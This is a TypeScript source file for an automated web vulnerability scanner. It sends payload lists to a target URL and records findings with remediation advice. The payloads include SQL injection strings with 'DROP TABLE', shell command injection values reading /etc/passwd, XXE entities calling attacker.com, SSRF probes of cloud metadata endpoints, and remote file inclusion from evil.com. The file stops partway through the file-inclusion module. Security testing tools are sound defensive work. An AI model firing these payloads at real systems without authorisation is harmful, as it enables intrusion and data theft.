import axios from 'axios';
import * as cheerio from 'cheerio';
import { storage } from './storage';
import { type Scan, type InsertVulnerability } from '@shared/schema';

interface ScanModule {
  name: string;
  test: (scan: Scan) => Promise<void>;
  weight: number;
}

export class SecurityScanner {
  private modules: Map<string, ScanModule> = new Map();

  constructor() {
    this.initializeModules();
  }

  private initializeModules() {
    this.modules.set('sql_injection', {
      name: 'SQL Injection',
      test: this.testSqlInjection.bind(this),
      weight: 25
    });

    this.modules.set('xss', {
      name: 'XSS Detection',
      test: this.testXSS.bind(this),
      weight: 20
    });

    this.modules.set('directory_traversal', {
      name: 'Directory Traversal',
      test: this.testDirectoryTraversal.bind(this),
      weight: 20
    });

    this.modules.set('command_injection', {
      name: 'Command Injection',
      test: this.testCommandInjection.bind(this),
      weight: 25
    });

    this.modules.set('ldap_injection', {
      name: 'LDAP Injection',
      test: this.testLdapInjection.bind(this),
      weight: 15
    });

    this.modules.set('xml_injection', {
      name: 'XML Injection',
      test: this.testXmlInjection.bind(this),
      weight: 15
    });

    this.modules.set('nosql_injection', {
      name: 'NoSQL Injection',
      test: this.testNoSqlInjection.bind(this),
      weight: 20
    });

    this.modules.set('ssti', {
      name: 'Server-Side Template Injection',
      test: this.testSSTI.bind(this),
      weight: 20
    });

    this.modules.set('xxe', {
      name: 'XML External Entity (XXE)',
      test: this.testXXE.bind(this),
      weight: 15
    });

    this.modules.set('ssrf', {
      name: 'Server-Side Request Forgery',
      test: this.testSSRF.bind(this),
      weight: 15
    });

    this.modules.set('auth_bypass', {
      name: 'Auth Bypass',
      test: this.testAuthBypass.bind(this),
      weight: 15
    });

    this.modules.set('parameter_fuzzing', {
      name: 'Parameter Fuzzing',
      test: this.testParameterFuzzing.bind(this),
      weight: 10
    });

    this.modules.set('ssl_tls', {
      name: 'SSL/TLS Analysis',
      test: this.testSSLTLS.bind(this),
      weight: 10
    });

    this.modules.set('csrf', {
      name: 'Cross-Site Request Forgery',
      test: this.testCSRF.bind(this),
      weight: 10
    });

    this.modules.set('file_inclusion', {
      name: 'File Inclusion (LFI/RFI)',
      test: this.testFileInclusion.bind(this),
      weight: 15
    });

    // ── NEW MODULES ──────────────────────────────────────────────────────────

    this.modules.set('open_redirect', {
      name: 'Open Redirect',
      test: this.testOpenRedirect.bind(this),
      weight: 12
    });

    this.modules.set('cors_misconfiguration', {
      name: 'CORS Misconfiguration',
      test: this.testCORSMisconfiguration.bind(this),
      weight: 15
    });

    this.modules.set('security_headers', {
      name: 'Security Headers Analysis',
      test: this.testSecurityHeaders.bind(this),
      weight: 10
    });

    this.modules.set('sensitive_data_exposure', {
      name: 'Sensitive Data Exposure',
      test: this.testSensitiveDataExposure.bind(this),
      weight: 20
    });

    this.modules.set('http_methods', {
      name: 'HTTP Methods Testing',
      test: this.testHTTPMethods.bind(this),
      weight: 8
    });

    this.modules.set('clickjacking', {
      name: 'Clickjacking Detection',
      test: this.testClickjacking.bind(this),
      weight: 8
    });

    this.modules.set('rate_limiting', {
      name: 'Rate Limiting Check',
      test: this.testRateLimiting.bind(this),
      weight: 10
    });

    this.modules.set('broken_access_control', {
      name: 'Broken Access Control',
      test: this.testBrokenAccessControl.bind(this),
      weight: 20
    });
  }

  async startScan(scanId: string): Promise<void> {
    const scan = await storage.getScan(scanId);
    if (!scan) throw new Error('Scan not found');

    await storage.updateScan(scanId, {
      status: 'running',
      startedAt: new Date(),
      progress: 0
    });

    try {
      let totalWeight = 0;
      let completedWeight = 0;

      scan.enabledModules.forEach(moduleId => {
        const module = this.modules.get(moduleId);
        if (module) totalWeight += module.weight;
      });

      for (const moduleId of scan.enabledModules) {
        const module = this.modules.get(moduleId);
        if (!module) continue;

        await storage.updateScan(scanId, { currentModule: module.name });

        try {
          await module.test(scan);
        } catch (error) {
          console.error(`Error in module ${module.name}:`, error);
        }

        completedWeight += module.weight;
        const progress = Math.round((completedWeight / totalWeight) * 100);
        await storage.updateScan(scanId, { progress });
      }

      await storage.updateScan(scanId, {
        status: 'completed',
        completedAt: new Date(),
        currentModule: null,
        progress: 100
      });
    } catch (error) {
      console.error('Scan failed:', error);
      await storage.updateScan(scanId, {
        status: 'failed',
        completedAt: new Date(),
        currentModule: null
      });
    }
  }

  // ─── Helpers ───────────────────────────────────────────────────────────────

  private async incrementRequestCount(scanId: string): Promise<void> {
    const scan = await storage.getScan(scanId);
    if (scan) {
      await storage.updateScan(scanId, { requestsSent: scan.requestsSent + 1 });
    }
  }

  private detectSqlErrors(response: string): boolean {
    const errorPatterns = [
      /mysql_fetch_array/i,
      /ORA-\d{5}/i,
      /Microsoft OLE DB Provider/i,
      /SQL Server/i,
      /PostgreSQL/i,
      /sqlite3/i,
      /You have an error in your SQL syntax/i,
      /Unclosed quotation mark after/i,
      /syntax error/i
    ];
    return errorPatterns.some(p => p.test(response));
  }

  private extractSqlErrorEvidence(response: string): string {
    const lines = response.split('\n');
    for (const line of lines) {
      if (this.detectSqlErrors(line)) return line.trim().substring(0, 200);
    }
    return 'SQL error detected in response';
  }

  private detectSystemFiles(response: string): boolean {
    return [
      /root:.*:0:0:/i,
      /\[boot loader\]/i,
      /127\.0\.0\.1.*localhost/i,
      /# This is the main Apache HTTP server configuration file/i
    ].some(p => p.test(response));
  }

  private detectAdminContent(response: string): boolean {
    return [
      /admin panel/i, /dashboard/i, /control panel/i, /administrator/i,
      /wp-admin/i, /<title>.*admin/i, /user management/i, /system settings/i
    ].some(p => p.test(response));
  }

  private detectCommandExecution(response: string, _payload: string): boolean {
    return [
      /uid=\d+\(.*?\)\s+gid=\d+\(.*?\)/i,
      /root:x:0:0:/i,
      /PING.*bytes of data/i,
      /total \d+/i,
      /Microsoft Windows/i,
      /Linux.*GNU\/Linux/i,
      /bin\/bash/i,
      /command not found/i
    ].some(p => p.test(response)) ||
      response.includes('uid=') || response.includes('gid=');
  }

  private extractCommandEvidence(response: string): string {
    const lines = response.split('\n');
    for (const line of lines) {
      if (line.includes('uid=') || line.includes('root:') ||
        line.includes('PING') || line.includes('total ')) {
        return line.trim().substring(0, 200);
      }
    }
    return 'Command execution indicators detected';
  }

  private detectLdapVulnerability(response: string): boolean {
    return [/ldap.*error/i, /invalid.*ldap/i, /bind.*failed/i, /ldap.*syntax/i, /ldap.*filter/i, /cn=.*dc=/i]
      .some(p => p.test(response));
  }

  private detectXmlInjection(response: string): boolean {
    return [/xml.*parse.*error/i, /malformed.*xml/i, /xml.*syntax.*error/i, /unexpected.*xml/i, /<\?xml.*version/i]
      .some(p => p.test(response));
  }

  private detectNoSqlInjection(response: string): boolean {
    return [/mongodb.*error/i, /\$where.*error/i, /invalid.*objectid/i, /mongo.*syntax/i, /bson.*error/i]
      .some(p => p.test(response));
  }

  private detectSSTI(response: string, payload: string): boolean {
    if (payload.includes('7*7') && response.includes('49')) return true;
    if (payload.includes("7*'7'") && response.includes('7777777')) return true;
    return [/class.*object/i, /config.*items/i, /__class__.*__mro__/i, /java\.lang\.System/i, /template.*syntax.*error/i]
      .some(p => p.test(response));
  }

  private detectXXE(response: string): boolean {
    return [/root:.*:0:0:/i, /127\.0\.0\.1.*localhost/i, /<\?xml.*<!DOCTYPE/i, /ENTITY.*SYSTEM/i, /external.*entity/i]
      .some(p => p.test(response)) || response.includes('root:x:0:0:');
  }

  private detectSSRF(response: string, payload: string): boolean {
    return [/connection.*refused/i, /timeout.*connecting/i, /ssh.*protocol/i, /metadata/i, /ami-id/i, /instance-id/i, /computeMetadata/i]
      .some(p => p.test(response)) ||
      (payload.includes('127.0.0.1') && response.includes('SSH')) ||
      (payload.includes('metadata') && response.includes('ami-'));
  }

  private detectCSRFProtection(response: string): boolean {
    return [/csrf.*token/i, /authenticity.*token/i, /_token.*value/i, /name="csrf"/i, /name="_token"/i]
      .some(p => p.test(response));
  }

  private detectFileInclusion(response: string, payload: string): boolean {
    return [/root:x:0:0:/i, /127\.0\.0\.1.*localhost/i, /<\?php/i, /\[boot loader\]/i, /include.*warning/i, /failed.*open.*stream/i, /no such file/i]
      .some(p => p.test(response)) ||
      (payload.includes('passwd') && response.includes('root:')) ||
      (payload.includes('base64') && response.includes('<?php'));
  }

  // ─── Existing Test Methods ──────────────────────────────────────────────────

  private async testSqlInjection(scan: Scan): Promise<void> {
    const sqlPayloads = [
      "' OR '1'='1",
      "' UNION SELECT 1--",
      "'; DROP TABLE users--",
      "1' OR 1=1#",
      "admin'--",
      "' OR 'a'='a",
      "1 UNION SELECT null,@@version,null--"
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of sqlPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          const originalValue = params.get(key);
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 10000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (this.detectSqlErrors(response.data)) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'sql_injection',
              severity: 'high',
              title: 'SQL Injection Vulnerability',
              description: `SQL injection vulnerability detected in parameter '${key}'. An attacker can manipulate database queries by injecting malicious SQL code through this parameter, potentially reading, modifying, or deleting all data in the database.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: this.extractSqlErrorEvidence(response.data),
              recommendation: 'Use parameterized queries (prepared statements) and enforce input validation. Never concatenate user input directly into SQL strings. Apply principle of least privilege to the database account.',
              cweId: 'CWE-89',
              cvssScore: '7.5'
            });
            break;
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testXSS(scan: Scan): Promise<void> {
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "'><script>alert('XSS')</script>",
      "<body onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')>"
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of xssPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 10000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (response.data.includes(payload)) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'xss',
              severity: 'medium',
              title: 'Cross-Site Scripting (XSS) Vulnerability',
              description: `Reflected XSS vulnerability detected in parameter '${key}'. An attacker can craft a malicious URL that injects JavaScript into the victim's browser when they click it. This allows cookie theft, session hijacking, keylogging, or redirecting the user to phishing pages.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: `Payload reflected in response: ${payload.substring(0, 100)}`,
              recommendation: 'Implement HTML entity encoding on all user-supplied output. Use a Content Security Policy (CSP) header. Validate and sanitize all inputs. Use modern frameworks that auto-escape by default.',
              cweId: 'CWE-79',
              cvssScore: '6.1'
            });
          }
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testDirectoryTraversal(scan: Scan): Promise<void> {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd'
    ];

    for (const payload of traversalPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        testUrl.pathname += (testUrl.pathname.endsWith('/') ? '' : '/') + payload;

        const response = await axios.get(testUrl.toString(), {
          timeout: 10000, validateStatus: () => true
        });
        await this.incrementRequestCount(scan.id);

        if (this.detectSystemFiles(response.data)) {
          await storage.createVulnerability({
            scanId: scan.id,
            type: 'directory_traversal',
            severity: 'high',
            title: 'Directory Traversal Vulnerability',
            description: `Path traversal vulnerability allows reading arbitrary files outside the web root. An attacker can navigate the server file system using "../" sequences to access sensitive files like /etc/passwd, private keys, config files, or application source code.`,
            url: testUrl.toString(),
            parameter: null,
            payload,
            evidence: 'System file content detected in response',
            recommendation: 'Validate and canonicalize all file paths. Use a whitelist of allowed paths. Chroot or jail the web process. Never expose the file system directly via URL parameters.',
            cweId: 'CWE-22',
            cvssScore: '7.5'
          });
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testCommandInjection(scan: Scan): Promise<void> {
    const commandPayloads = [
      '; id', '&& id', '|| id', '| id', '`id`', '$(id)',
      '; cat /etc/passwd', '&& whoami', '|| uname -a',
      '; ls -la', '; sleep 5', '&& sleep 5 &&'
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of commandPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          const originalValue = params.get(key);
          params.set(key, `${originalValue}${payload}`);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 15000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (this.detectCommandExecution(response.data, payload)) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'command_injection',
              severity: 'critical',
              title: 'OS Command Injection Vulnerability',
              description: `Command injection in parameter '${key}' allows executing arbitrary operating system commands on the server. An attacker can run any shell command as the web server user: read files, create backdoors, pivot to internal networks, or take complete control of the server.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: this.extractCommandEvidence(response.data),
              recommendation: 'Never pass user input to shell commands. Use language-level APIs instead of shell calls. If shell calls are unavoidable, use strict allowlisting. Run the web service as a minimal-privilege user.',
              cweId: 'CWE-78',
              cvssScore: '9.8'
            });
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testLdapInjection(scan: Scan): Promise<void> {
    const ldapPayloads = ['*', '*)(uid=*', '*)(|(uid=*', '*)|(cn=*', '*(|(password=*))', '*(|(mail=*@*))(|(uid=*))'];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of ldapPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          const originalValue = params.get(key);
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 10000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (this.detectLdapVulnerability(response.data)) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'ldap_injection',
              severity: 'high',
              title: 'LDAP Injection Vulnerability',
              description: `LDAP injection in parameter '${key}'. An attacker can manipulate LDAP queries to bypass authentication (log in without a password), enumerate all users in the directory, or extract sensitive attributes like email addresses, phone numbers, and group memberships.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: 'LDAP error or bypass pattern detected',
              recommendation: 'Use an LDAP library that supports parameterized queries. Escape all special LDAP characters in user input. Apply input validation and reduce directory query privileges.',
              cweId: 'CWE-90',
              cvssScore: '7.5'
            });
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testXmlInjection(scan: Scan): Promise<void> {
    const xmlPayloads = [
      '<![CDATA[<script>alert("XSS")</script>]]>',
      '</test><test>',
      '<?xml-stylesheet type="text/xsl" href="malicious.xsl"?>',
      '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of xmlPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          const originalValue = params.get(key);
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 10000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (this.detectXmlInjection(response.data)) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'xml_injection',
              severity: 'medium',
              title: 'XML Injection Vulnerability',
              description: `XML injection in parameter '${key}'. An attacker can break out of XML structure to alter the data being processed, inject additional XML elements, or combine with XXE to read local files and perform server-side request forgery.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: 'XML structure manipulation detected',
              recommendation: 'Validate and sanitize all XML input. Use a secure XML parser with DTD processing disabled. Enforce strict schema validation.',
              cweId: 'CWE-91',
              cvssScore: '6.1'
            });
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testNoSqlInjection(scan: Scan): Promise<void> {
    const nosqlPayloads = [
      '{"$ne": null}', '{"$gt": ""}', '{"$where": "this.password.match(/.*/)"}',
      '{"$regex": ".*"}', '{"$exists": true}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}'
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of nosqlPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          const originalValue = params.get(key);
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 15000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (this.detectNoSqlInjection(response.data)) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'nosql_injection',
              severity: 'high',
              title: 'NoSQL Injection Vulnerability',
              description: `NoSQL injection in parameter '${key}'. An attacker can manipulate MongoDB, CouchDB, or similar NoSQL queries using special operators ($ne, $gt, $regex) to bypass authentication, enumerate collections, or exfiltrate all documents without knowing credentials.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: 'NoSQL query manipulation detected',
              recommendation: 'Validate types strictly before passing to NoSQL queries. Use an ODM library. Disable $where operator. Sanitize operator characters in input.',
              cweId: 'CWE-943',
              cvssScore: '8.1'
            });
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testSSTI(scan: Scan): Promise<void> {
    const sstiPayloads = [
      '{{7*7}}', '${7*7}', '#{7*7}', '<%=7*7%>',
      "{{7*'7'}}", '<%= 7 * 7 %>'
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of sstiPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          const originalValue = params.get(key);
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 10000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (this.detectSSTI(response.data, payload)) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'ssti',
              severity: 'critical',
              title: 'Server-Side Template Injection (SSTI)',
              description: `Template injection in parameter '${key}'. An attacker can run arbitrary Python, Ruby, Java, or JavaScript code on the server by injecting template expressions. This typically leads to full remote code execution, file system access, and complete server compromise.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: 'Template expression evaluated in server response',
              recommendation: 'Never pass user input to template engines unsanitized. Use a logic-less template engine or sandbox templates. Treat template rendering as code execution.',
              cweId: 'CWE-1336',
              cvssScore: '9.8'
            });
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testXXE(scan: Scan): Promise<void> {
    const xxePayloads = [
      '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
      '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><root></root>',
      '<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><xxe>&xxe;</xxe>'
    ];

    for (const payload of xxePayloads) {
      try {
        const response = await axios.post(scan.targetUrl, payload, {
          headers: { 'Content-Type': 'application/xml' },
          timeout: 10000, validateStatus: () => true
        });
        await this.incrementRequestCount(scan.id);

        if (this.detectXXE(response.data)) {
          await storage.createVulnerability({
            scanId: scan.id,
            type: 'xxe',
            severity: 'high',
            title: 'XML External Entity (XXE) Injection',
            description: `XXE vulnerability allows an attacker to reference external entities in XML documents. By defining a custom DTD entity pointing to a local file (file:///etc/passwd) or internal network address, attackers can read sensitive files, perform SSRF, or cause denial of service.`,
            url: scan.targetUrl,
            parameter: null,
            payload,
            evidence: 'File content or external entity response detected',
            recommendation: 'Disable external entity processing in your XML parser (e.g., set FEATURE_DISALLOW_DOCTYPE_DECL). Upgrade to a library with safe defaults. Validate all XML against a strict schema.',
            cweId: 'CWE-611',
            cvssScore: '8.6'
          });
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testSSRF(scan: Scan): Promise<void> {
    const ssrfPayloads = [
      'http://127.0.0.1:22', 'http://localhost:80',
      'http://169.254.169.254/latest/meta-data/',
      'file:///etc/passwd', 'http://0.0.0.0:22',
      'http://metadata.google.internal/computeMetadata/v1/'
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of ssrfPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          if (!['url', 'link', 'callback', 'redirect', 'next', 'to', 'src'].some(k => key.toLowerCase().includes(k))) continue;

          const originalValue = params.get(key);
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 10000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (this.detectSSRF(response.data, payload)) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'ssrf',
              severity: 'high',
              title: 'Server-Side Request Forgery (SSRF)',
              description: `SSRF in parameter '${key}' lets an attacker force the server to make HTTP requests to internal services, cloud metadata endpoints (AWS/GCP/Azure), or private network resources. This can expose cloud credentials, internal APIs, or allow pivoting inside a private network.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: 'Internal service response or metadata access detected',
              recommendation: 'Validate and allowlist permitted URL schemes and destinations. Block RFC-1918 and loopback addresses. Use a dedicated HTTP client that enforces an allowlist. Strip and validate redirects.',
              cweId: 'CWE-918',
              cvssScore: '8.6'
            });
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testAuthBypass(scan: Scan): Promise<void> {
    const authPaths = ['/admin', '/administrator', '/login', '/dashboard', '/panel', '/wp-admin', '/user', '/account'];

    for (const path of authPaths) {
      try {
        const testUrl = new URL(scan.targetUrl);
        testUrl.pathname = path;

        const response = await axios.get(testUrl.toString(), {
          timeout: 10000, validateStatus: () => true
        });
        await this.incrementRequestCount(scan.id);

        if (response.status === 200 && this.detectAdminContent(response.data)) {
          await storage.createVulnerability({
            scanId: scan.id,
            type: 'auth_bypass',
            severity: 'critical',
            title: 'Authentication Bypass — Exposed Admin Interface',
            description: `Administrative interface is accessible without authentication at path '${path}'. An attacker can directly access admin functionality, manage users, change settings, extract all data, or upload backdoors without supplying any credentials.`,
            url: testUrl.toString(),
            parameter: null,
            payload: null,
            evidence: 'Administrative content returned with HTTP 200 (no auth challenge)',
            recommendation: 'Enforce authentication on all admin routes. Use middleware that checks session/JWT before serving any admin content. Consider IP-allowlisting admin interfaces. Enable multi-factor authentication.',
            cweId: 'CWE-306',
            cvssScore: '9.8'
          });
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testParameterFuzzing(scan: Scan): Promise<void> {
    const fuzzPayloads = [
      'A'.repeat(1000),
      '"><script>alert(1)</script>',
      '../../../etc/passwd',
      '${7*7}', '{{7*7}}',
      'file:///etc/passwd',
      'http://evil.com/malware.exe'
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of fuzzPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 10000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (response.status === 500 || response.data.toString().includes('49')) {
            let severity: 'low' | 'medium' | 'high' = 'low';
            let title = 'Parameter Fuzzing Anomaly Detected';

            if (payload.includes('49') || payload.includes('7*7')) {
              severity = 'high';
              title = 'Possible Template/Expression Injection';
            } else if (response.status === 500) {
              severity = 'medium';
              title = 'Unhandled Error on Abnormal Input';
            }

            await storage.createVulnerability({
              scanId: scan.id,
              type: 'parameter_fuzzing',
              severity,
              title,
              description: `Parameter '${key}' exhibits unusual behavior when given unexpected input. This may indicate unhandled exceptions that leak stack traces, template injection, or other injection vulnerabilities. Attackers use fuzzing to discover hidden entry points.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: `HTTP ${response.status} — unusual response to fuzz payload`,
              recommendation: 'Implement strict type/length validation on all input parameters. Return generic error messages without stack traces. Handle all exceptions gracefully and log them server-side.',
              cweId: 'CWE-20',
              cvssScore: severity === 'high' ? '7.5' : severity === 'medium' ? '5.3' : '3.1'
            });
          }
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testSSLTLS(scan: Scan): Promise<void> {
    const url = new URL(scan.targetUrl);

    if (url.protocol !== 'https:') {
      await storage.createVulnerability({
        scanId: scan.id,
        type: 'ssl_tls',
        severity: 'medium',
        title: 'Insecure HTTP Protocol (No HTTPS)',
        description: `The site is served over plain HTTP. All communication between the browser and server is unencrypted. An attacker on the same network (coffee-shop Wi-Fi, ISP, or a man-in-the-middle position) can read login credentials, session cookies, and any sensitive data in transit.`,
        url: scan.targetUrl,
        parameter: null,
        payload: null,
        evidence: 'Site accessed over HTTP protocol',
        recommendation: 'Obtain a TLS certificate (free via Let\'s Encrypt) and redirect all HTTP traffic to HTTPS. Set Strict-Transport-Security (HSTS) to prevent downgrade attacks.',
        cweId: 'CWE-319',
        cvssScore: '5.3'
      });
      return;
    }

    try {
      const response = await axios.get(scan.targetUrl, {
        timeout: 10000, validateStatus: () => true
      });
      await this.incrementRequestCount(scan.id);

      const headers = response.headers;

      if (!headers['strict-transport-security']) {
        await storage.createVulnerability({
          scanId: scan.id,
          type: 'ssl_tls',
          severity: 'medium',
          title: 'Missing HTTP Strict Transport Security (HSTS)',
          description: 'Without HSTS, browsers may connect over HTTP before being redirected to HTTPS. A network attacker can intercept the initial HTTP request (SSL stripping attack) to downgrade the connection and read/modify all traffic.',
          url: scan.targetUrl,
          parameter: null,
          payload: null,
          evidence: 'Strict-Transport-Security header absent',
          recommendation: 'Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
          cweId: 'CWE-319',
          cvssScore: '5.4'
        });
      }

      if (!headers['x-content-type-options']) {
        await storage.createVulnerability({
          scanId: scan.id,
          type: 'ssl_tls',
          severity: 'low',
          title: 'Missing X-Content-Type-Options Header',
          description: 'Without X-Content-Type-Options: nosniff, browsers may "sniff" a response body and execute it as a different MIME type. An attacker who can upload content could trigger script execution by making the browser misinterpret a file as HTML or JavaScript.',
          url: scan.targetUrl,
          parameter: null,
          payload: null,
          evidence: 'X-Content-Type-Options header absent',
          recommendation: 'Add header: X-Content-Type-Options: nosniff',
          cweId: 'CWE-693',
          cvssScore: '3.7'
        });
      }
    } catch (_) { /* continue */ }
  }

  private async testCSRF(scan: Scan): Promise<void> {
    try {
      const response = await axios.get(scan.targetUrl, {
        timeout: 10000, validateStatus: () => true
      });
      await this.incrementRequestCount(scan.id);

      const hasCSRFToken = this.detectCSRFProtection(response.data);
      const headers = response.headers;

      if (!hasCSRFToken && !headers['x-frame-options'] &&
        !headers['content-security-policy']?.includes('frame-ancestors')) {

        await storage.createVulnerability({
          scanId: scan.id,
          type: 'csrf',
          severity: 'medium',
          title: 'Missing CSRF Protection',
          description: 'No CSRF tokens or anti-forgery headers detected. An attacker can host a page that silently submits forms to this site using the victim\'s authenticated session (cookies are sent automatically). This allows unauthorized actions such as password changes, money transfers, or account takeovers.',
          url: scan.targetUrl,
          parameter: null,
          payload: null,
          evidence: 'No CSRF token in forms, no X-Frame-Options, no CSP frame-ancestors',
          recommendation: 'Use CSRF tokens (synchronizer pattern or double-submit cookie). Set SameSite=Strict on session cookies. Add X-Frame-Options: DENY. Verify Origin/Referer headers on state-changing requests.',
          cweId: 'CWE-352',
          cvssScore: '6.8'
        });
      }
    } catch (_) { /* continue */ }
  }

  private async testFileInclusion(scan: Scan): Promise<void> {
    const payloads = [
      '../../../etc/passwd', '/etc/passwd',
      '../../../../../../../../etc/passwd%00',
      'php://filter/convert.base64-encode/resource=index.php',
      'expect://id', 'file:///etc/passwd',
      'http://evil.com/shell.txt', 'https://pastebin.com/raw/malicious'
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of payloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          if (!['file', 'include', 'page', 'path', 'template', 'load', 'view'].some(k => key.toLowerCase().includes(k))) continue;

          const originalValue = params.get(key);
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 10000, validateStatus: () => true
          });
          await this.incrementRequestCount(scan.id);

          if (this.detectFileInclusion(response.data, payload)) {
            const isRFI = payload.startsWith('http') || payload.startsWith('ftp');
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'file_inclusion',
              severity: isRFI ? 'critical' : 'high',
              title: isRFI ? 'Remote File Inclusion (RFI)' : 'Local File Inclusion (LFI)',
              description: isRFI
